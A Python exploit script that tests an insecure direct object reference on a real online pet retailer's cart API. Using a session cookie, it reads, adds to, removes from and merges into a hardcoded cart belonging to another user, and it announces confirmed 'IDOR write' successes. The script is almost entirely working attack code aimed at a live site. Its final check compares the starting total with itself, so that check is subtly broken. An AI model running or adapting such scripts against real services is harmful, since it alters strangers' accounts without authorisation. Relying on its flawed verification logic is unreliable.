#!/usr/bin/env python3
"""
Test cart write IDOR - based on 2025 working endpoints
"""

import requests
import json
import sys
import time

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_write_idor.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

print(f"[*] Testing cart write IDOR (2025 working endpoints)")
print(f"[*] Target cart UUID: {CART_UUID}")
print()

# Get current cart state
print("[*] Step 1: Get current cart state")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code != 200:
    print(f"[!] Failed to read cart: {r.status_code}")
    sys.exit(1)

cart_before = r.json()
before_count = len(cart_before.get("articles", []))
before_total = cart_before.get("summary", {}).get("grandTotal", 0)
existing_article_id = cart_before.get("articles", [{}])[0].get("id") if cart_before.get("articles") else None

print(f"[+] Cart before: {before_count} items, {before_total} EUR")
if existing_article_id:
    print(f"[+] Existing article ID: {existing_article_id}")
print()

# Test 1: Add article to foreign cart
print("[*] Step 2: Test 1 - Add article to foreign cart")
print("[*] POST /checkout/api/cart-api/v2/cart/{cartUuid}/articles")
test_offer_id = 2966095  # Real offerId from catalog

payload_add = {
    "offerId": test_offer_id
}

try:
    r = requests.post(
        f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/articles",
        headers=headers,
        json=payload_add,
        timeout=10
    )
    print(f"    HTTP {r.status_code}")
    print(f"    Response: {r.text[:500]}")
    
    if r.status_code in [200, 201]:
        print(f"    [!!!] SUCCESS! Article added!")
        response_data = r.json() if r.headers.get('content-type', '').startswith('application/json') else {}
        print(f"    Response data: {json.dumps(response_data, indent=2)[:500]}")
        
        # Verify
        time.sleep(1)
        r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
        if r2.status_code == 200:
            cart_after = r2.json()
            after_count = len(cart_after.get("articles", []))
            if after_count > before_count:
                print(f"    [!!!] VERIFIED: Cart now has {after_count} items (was {before_count})")
                print()
                print("[!!!] ========================================")
                print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                print("[!!!] ========================================")
                sys.exit(0)
    elif r.status_code == 403:
        print(f"    [X] Forbidden")
    elif r.status_code == 404:
        print(f"    [X] Not found")
except Exception as e:
    print(f"    Error: {e}")

# Test 2: Add via /add endpoint with form-data
print()
print("[*] Step 3: Test 2 - Add via /add endpoint (form-data)")
headers_form = headers.copy()
headers_form["Content-Type"] = "application/x-www-form-urlencoded"

try:
    r = requests.post(
        f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/add",
        headers=headers_form,
        data=f"offerId={test_offer_id}&quantity=1",
        timeout=10
    )
    print(f"    HTTP {r.status_code}")
    print(f"    Response: {r.text[:500]}")
    
    if r.status_code in [200, 201]:
        print(f"    [!!!] SUCCESS! Article added via /add!")
        
        # Verify
        time.sleep(1)
        r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
        if r2.status_code == 200:
            cart_after = r2.json()
            after_count = len(cart_after.get("articles", []))
            if after_count > before_count:
                print(f"    [!!!] VERIFIED: Cart now has {after_count} items")
                print()
                print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                sys.exit(0)
except Exception as e:
    print(f"    Error: {e}")

# Test 3: Remove article from foreign cart
if existing_article_id:
    print()
    print(f"[*] Step 4: Test 3 - Remove article {existing_article_id} from foreign cart")
    print(f"[*] POST /checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{existing_article_id}/remove")
    
    try:
        r = requests.post(
            f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{existing_article_id}/remove",
            headers=headers,
            timeout=10
        )
        print(f"    HTTP {r.status_code}")
        print(f"    Response: {r.text[:500]}")
        
        if r.status_code in [200, 204]:
            print(f"    [!!!] SUCCESS! Article removed!")
            
            # Verify
            time.sleep(1)
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                if after_count < before_count:
                    print(f"    [!!!] VERIFIED: Cart now has {after_count} items (was {before_count})")
                    print()
                    print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                    sys.exit(0)
    except Exception as e:
        print(f"    Error: {e}")

# Test 4: Merge carts
print()
print("[*] Step 5: Test 4 - Merge carts")
# Get Account B's own cart UUID
r_own = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart", headers=headers)
own_cart_uuid = None
if r_own.status_code == 200:
    own_cart = r_own.json()
    own_cart_uuid = own_cart.get("sid")
    print(f"[+] Account B's cart UUID: {own_cart_uuid}")

if own_cart_uuid:
    payload_merge = {
        "sourceCartId": own_cart_uuid
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}/merge",
            headers=headers,
            json=payload_merge,
            timeout=10
        )
        print(f"    HTTP {r.status_code}")
        print(f"    Response: {r.text[:500]}")
        
        if r.status_code in [200, 201, 204]:
            print(f"    [!!!] SUCCESS! Carts merged!")
            
            # Verify
            time.sleep(1)
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                print(f"    [!!!] VERIFIED: Cart now has {after_count} items")
                print()
                print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                sys.exit(0)
    except Exception as e:
        print(f"    Error: {e}")

print()
print("[*] Final verification...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    print(f"[+] Cart after: {after_count} items, {after_total} EUR")
    
    if before_count != after_count or abs(before_total - before_total) > 0.01:
        print()
        print("[!!!] ========================================")
        print("[!!!] CART WAS MODIFIED!")
        print("[!!!] ========================================")
        print(f"[!!!] Before: {before_count} items, {before_total} EUR")
        print(f"[!!!] After:  {after_count} items, {after_total} EUR")
        print()
        print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
    else:
        print("[!] Cart unchanged - write operations may be protected")

